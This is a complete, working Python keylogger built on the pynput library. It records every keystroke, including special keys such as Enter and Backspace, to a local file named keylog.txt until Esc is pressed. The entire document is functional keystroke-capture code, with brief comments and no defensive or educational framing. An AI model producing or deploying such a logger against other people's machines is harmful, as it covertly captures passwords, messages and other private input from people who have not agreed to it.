from pynput import keyboard

def on_press(key):
    try:
        # Log the character of the key pressed
        with open("keylog.txt", "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        # Log special keys (e.g., space, enter, backspace)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'[{key}]')

def on_release(key):
    # Stop keylogger when Esc key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener for key press and release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
